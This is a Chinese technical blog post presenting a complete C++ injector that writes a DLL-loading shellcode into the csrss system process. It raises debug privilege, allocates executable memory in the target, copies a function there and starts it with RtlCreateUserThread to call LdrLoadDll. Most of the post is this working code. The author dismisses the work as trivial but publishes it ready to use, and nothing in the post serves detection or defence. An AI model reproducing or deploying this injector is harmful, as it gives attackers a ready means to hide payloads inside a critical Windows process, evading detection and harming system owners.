
# 纯C++编写Win32/X64通用Shellcode注入csrss进程

这是做的一些研究，觉得没什么用处，人生不应该把精力放在这些小打小闹的垃圾玩意身上；先讲一下文章的主题这样做的目的，这样做免去了用汇编代码限制，纯C++编写的东西移植性高。

注入`csrss`进程要点：只能用导入表之存在`ntdll`的dll进行注入，否则会失败。其他要点基本上没什么了，`csrss`进程pid使用`CsrGetProcessId()`函数获取，免去了遍历进程的痛苦。

看下我们的注入器（这是Win32/x64通用的）。

```
#include "main.h"
#include "base/component_name.h"

namespace bootldr{
	static HANDLE WINAPI ShellcodeBegin(PTHREAD_DATA parameter){
		if (parameter->fnRtlInitUnicodeString != nullptr&&parameter->fnLdrLoadDll != nullptr){
			UNICODE_STRING UnicodeString;
			parameter->fnRtlInitUnicodeString(&UnicodeString, parameter->dllpath);
			HANDLE module_handle = nullptr;
			return (HANDLE)parameter->fnLdrLoadDll(nullptr, nullptr, &UnicodeString, &module_handle);
		}
		else{
			return (HANDLE)-3;
		}
	}

	static DWORD WINAPI ShellcodeEnd(){
		return 0;
	}

	static bool SetProcessPrivilege(DWORD SE_DEBUG_PRIVILEGE = 0x14){
		BOOLEAN bl;
		RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bl);
		return bl;
	}

	static bool ProcessInternalExecute(PTHREAD_DATA parameter,DWORD process_id){
		HANDLE hProcess = nullptr;
		CLIENT_ID cid = { (HANDLE)process_id, nullptr };
		OBJECT_ATTRIBUTES oa;
		InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
		if (!NT_SUCCESS(NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid))){
			return false;
		}
		PVOID data = VirtualAllocEx(hProcess, NULL, 0x2000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		PVOID code = VirtualAllocEx(hProcess, NULL, 0x2000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!data || !code){
			NtClose(hProcess);
			return false;
		}
		NtWriteVirtualMemory(hProcess, data, parameter, sizeof(THREAD_DATA), NULL);
		NtWriteVirtualMemory(hProcess, code, (PVOID)ShellcodeBegin, (ULONG)((LPBYTE)ShellcodeEnd - (LPBYTE)ShellcodeBegin), NULL);
		HANDLE hThread = nullptr;
		if (!NT_SUCCESS(RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, code, data, &hThread, NULL))){
			NtClose(hProcess);
			return false;
		}
		NtWaitForSingleObject(hThread, FALSE, NULL);
		DWORD exit_code = -1;
		GetExitCodeThread(hThread, &exit_code);
		NtClose(hThread);
		VirtualFreeEx(hProcess, data, 0, MEM_RELEASE);
		VirtualFreeEx(hProcess, code, 0, MEM_RELEASE);
		NtClose(hProcess);
		return (exit_code==0);
	}

	std::wstring GetAbsolutePath(const std::wstring& name){
		wchar_t fileName[MAX_PATH] = {0};
		GetModuleFileNameW(NULL, fileName, MAX_PATH);
		PathRemoveFileSpec(fileName);
		return std::wstring(fileName).append(name);
	}

	void SetShellcodeLdrModulePath(PTHREAD_DATA parameter,const std::wstring& srcfile){
		wcscpy_s(parameter->dllpath, srcfile.c_str());
	}
}

int WINAPI wWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPWSTR lpCmdLine,int nShowCmd){
	THREAD_DATA parameter = {0};
	parameter.fnRtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString");
	parameter.fnLdrLoadDll = (pLdrLoadDll)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "LdrLoadDll");
	parameter.fnGetTempPathW = (pGetTempPathW)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "GetTempPathW");
	parameter.fnGetSystemDirectoryW = (pGetSystemDirectoryW)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "GetSystemDirectoryW");
	parameter.fnGetVolumeInformationW = (pGetVolumeInformationW)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "GetVolumeInformationW");
	bootldr::SetProcessPrivilege();
	bootldr::SetShellcodeLdrModulePath(&parameter, bootldr::GetAbsolutePath(base::kBootldrName));
	bootldr::ProcessInternalExecute(&parameter, GetCurrentProcessId()/*CsrGetProcessId()*/);
	return 0;
}
```

这里再看一下我们的shellcode式的加载器，该动态库加载一个第三方dll，没有导入任何函数，全部函数通过动态获取（如果你不知道怎么动态获取，请先去研究PEB链表）。
